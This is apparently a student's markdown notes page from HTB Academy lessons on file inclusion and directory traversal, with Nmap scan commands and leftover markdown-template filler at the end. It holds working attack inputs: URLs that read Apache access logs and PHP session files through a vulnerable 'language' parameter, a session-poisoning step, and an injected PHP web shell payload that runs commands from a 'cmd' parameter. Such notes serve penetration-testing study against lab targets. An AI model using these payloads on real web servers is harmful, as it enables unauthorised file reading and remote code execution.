# Hacking Lessons
Lessons and Tutorials Covered
*
* `<File Inclusion>' Directory Traversal (HTB Academy)> File Inclusion / Directory Traversal
* Nmap
*

* Connect to VPN
> sudo openvpn user.ovpn





## File Inclusion / Directory Traversal (HTB Academy)
Often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en; then the website will grab files from the /en/ directory.

* RCE through PHP Session Files
Default page url with php and access to logs
> http://46.101.91.21:32430/index.php?language=/var/log/apache2/access.log

* Cookie retrival and Poison
Get cookie from browser inspector. Then look the cookie up via browser url
> http://46.101.91.21:32430/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage
Poison the Cookie 
> http://46.101.91.21:32430/index.php?language=session_poisoning

* Prime the website for code injection
> http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>




## Nmap
nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
nmap -sS -sC -sV -Pn -p- -T4 -A host ip
nmap -sV --script=smb* host ip


* list
  * list

1. list 
2. list 

> Blockquote
> 
`<addr>` inline clode

```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```


- [x] this is a complete item
- [ ] this is an incomplete item
